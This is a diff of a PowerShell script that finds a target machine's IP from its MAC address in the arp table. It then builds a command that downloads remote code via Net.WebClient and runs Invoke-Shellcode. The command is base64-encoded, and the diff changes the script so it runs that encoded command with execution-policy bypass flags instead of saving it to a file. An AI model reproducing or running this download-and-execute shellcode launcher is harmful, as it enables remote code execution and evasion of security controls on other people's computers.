@@ -1,5 +1,6 @@
-﻿$Tablet = "BurnD-Sero"
-$Computer = "BurnD-Machine"
+# Automatically find IP Addresses From Mac Address
+$Computer = "24:77:03:22:09:60"
+$Tablet = "00:1A:99:D4:F3:43"
 try {
     $DevIP = arp -a | select-string "$Computer" |% { $_.ToString().Trim().Split(" ")[0] }
     }
@@ -16,4 +17,4 @@ $rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode
 Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
 $obfscmd = [Convert]::ToBase64String($bytes)
-Echo $obfscmd > "C:\Users\Bryan Louiselle\Desktop\Obfuscated_Command.txt"
+Powershell -Exec Bypass -Nol -Enc $obfscmd
